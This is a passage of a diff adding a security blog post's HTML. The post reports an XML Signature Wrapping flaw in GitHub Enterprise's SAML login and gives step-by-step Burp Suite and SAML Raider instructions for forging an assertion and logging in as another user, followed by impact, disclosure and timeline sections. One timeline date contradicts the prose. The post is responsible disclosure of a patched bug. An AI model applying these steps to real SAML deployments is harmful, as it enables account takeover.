+<span class="n">validate_destination</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+<span class="n">validate_recipient</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+<span class="n">validate_conditions</span>
+<span class="n">validate_audience</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+<span class="n">validate_name_id_format</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:name_id_format</span><span class="o">]</span><span class="p">)</span>
+</pre>
+<p>would return true as they operate on data of the Forged Assertion and the attacker can freely control them to be valid.</p>
+<div class="section" id="poc-steps-to-reproduce">
+<h4><a class="toc-backref" href="#id15">PoC - Steps to reproduce</a></h4>
+<p>The code/toolset that I was using for testing is not yet in a form to be released/shared (hopefully soon) so I used <a class="reference external" href="https://github.com/SAMLRaider/SAMLRaider">SAML Raider</a> in order to describe a PoC with steps to be reproduced by Github Security team.</p>
+<ol class="arabic">
+<li><p class="first">Set up GHE for SAML authentication with a SAML Identity Provider of
+your liking.</p>
+</li>
+<li><p class="first">Install Burp Suite and SAML Raider plugin and start Burp Suite</p>
+</li>
+<li><p class="first">Configure your browser to use Burp Suite as proxy</p>
+</li>
+<li><p class="first">Start the login process to GHE</p>
+</li>
+<li><p class="first">Intercept the SAML Authn Request and forward</p>
+<div class="figure">
+<img alt="SAML Authentication Request" src="/images/xsw1.png" style="width: 80%;" />
+</div>
+</li>
+<li><p class="first">Login at your Identity Provider as a valid user</p>
+</li>
+<li><p class="first">Intercept the SAML Response</p>
+<div class="figure">
+<img alt="SAML Authentication Response" src="/images/xsw2.png" style="width: 80%;" />
+</div>
+</li>
+<li><p class="first">In the SAML Raider window select XSW3 from the available attacks and
+click on &quot;Apply XSW&quot;</p>
+</li>
+<li><p class="first">Check the SAML response below to see that it is changed, and change
+the name in the Subject of the Assertion with ID
+<tt class="docutils literal">_evil_assertion_ID</tt> to something else ( i.e. &quot;victim_account&quot;)</p>
+<div class="figure">
+<img alt="Forge Assertion" src="/images/xsw3.png" style="width: 80%;" />
+</div>
+</li>
+<li><p class="first">Click Forward and check that you are logged in as <tt class="docutils literal">victim_account</tt></p>
+<div class="figure">
+<img alt="Logged in as victim" src="/images/xsw4.png" style="width: 80%;" />
+</div>
+</li>
+</ol>
+</div>
+<div class="section" id="exploitability">
+<h4><a class="toc-backref" href="#id16">Exploitability</a></h4>
+<p>An attacker can bypass authentication given one of the following is true</p>
+<ol class="arabic simple">
+<li>The attacker is an existing user of a GHE instance that uses SAML authentication.</li>
+<li>The attacker is an existing user of a SAML Identity Provider that is configured as a trusted Identity Provider for a GHE instance that
+uses SAML authentication</li>
+<li>Or the attacker can get their hands on a valid signed assertion
+(<em>only</em> the signature needs to be valid, the rest can be anything)
+from a SAML Identity Provider that is configured as a trusted
+Identity Provider for a GHE instance that uses SAML authentication.
+Note that this assertion destination can be any other SAML Service
+Provider. Possible sources for this can be Identity Provider logs,
+other Service Provider logs, mailing list archives, StackOverflow
+Questions , etc.</li>
+</ol>
+<p>Note that an external attacker has the inherent difficulty as they would need a valid Assertion from a trusted Identity Provider in order to mount the attack. However the fact that the Assertion can be</p>
+<ul class="simple">
+<li>expired</li>
+<li>or even destined to another Service Provider</li>
+</ul>
+<p>significantly raises the chances.</p>
+</div>
+<div class="section" id="impact">
+<h4><a class="toc-backref" href="#id17">Impact</a></h4>
+<ul class="simple">
+<li>An external attacker taking advantage of this can authenticate to a GHE instance as any user</li>
+<li>An internal attacker taking advantage of this can authenticate to a GHE instance as any user</li>
+<li>An internal attacker taking advantage of this can elevate their rights to admin in a GHE instance</li>
+</ul>
+</div>
+<div class="section" id="id1">
+<h4><a class="toc-backref" href="#id18">Disclosure</a></h4>
+<p>I reported this to Github security via Hackerone on 16th of January. It was acknowledged and triaged after a couple of hours and resolved on January 31st with GHE version <a class="reference external" href="https://enterprise.github.com/releases/2.8.7/notes">2.8.7</a></p>
+</div>
+</div>
+</div>
+<div class="section" id="timeline">
+<h2><a class="toc-backref" href="#id19">Timeline</a></h2>
+<ul class="simple">
+<li>2017-01-10: Incorrect XML Signature validation vulnerability discovered and reported</li>
+<li>2017-01-10: Report acknowledged</li>
+<li>2017-01-11: Report triaged</li>
+<li>2017-01-12: Mitigation released with v. 2.8.6 and bounty awarded</li>
+<li>2017-01-16: XSW vulnerability discovered and reported</li>
+<li>2017-01-16: Report acknowledged and triaged</li>
+<li>2017-01-27: Asked for update on mitigation/release</li>
+<li>2017-01-12: Mitigation released with v. 2.8.7 and bounty awarded</li>
+</ul>
+</div>
+<div class="section" id="full-saml-implementation-assessment">
+<h2><a class="toc-backref" href="#id20">Full SAML Implementation Assessment</a></h2>
+<p>Following the above reports I received a research grant in order to continue looking into Github's SAML implementation. I performed a full (to the extend that the agreed timeframe and my off-work availability allowed) security audit which uncovered a couple of minor issues and a set of suggestions/recommendations about the implementation in order to minimize the possibility of similar issues in the future.</p>
+</div>
+<div class="section" id="outro">
+<h2><a class="toc-backref" href="#id21">Outro</a></h2>
+<p>I enjoyed finding and writing these so I hope if you made it through to the end, you did too. Working with the Github Security guys was a bliss and I can verify first hand that their approach towards their bounty program is as serious and as cool as they describe it on their recent <a class="reference external" href="https://githubengineering.com/githubs-bug-bounty-workflow/">blog post</a></p>
+</div>
+
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="http://www.economyofmechanism.com/tag/saml.html">SAML</a>
+      <a href="http://www.economyofmechanism.com/tag/authentication.html">authentication</a>
+      <a href="http://www.economyofmechanism.com/tag/xsw.html">XSW</a>
+    </p>
+  </div>
+
+
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'jkakavas.disqus.com';
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>
+        Please enable JavaScript to view comments.
+
+</noscript>
+</article>
+
+    <footer>
+<p>
+  &copy; Ioannis Kakavas 2016 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>
+</p>
+<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a>
+</p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+         src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-76540948-1', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Economy of mechanism ",
+  "url" : "http://www.economyofmechanism.com",
+  "image": "",
+  "description": ""
+}
+</script>
+</body>
+</html>
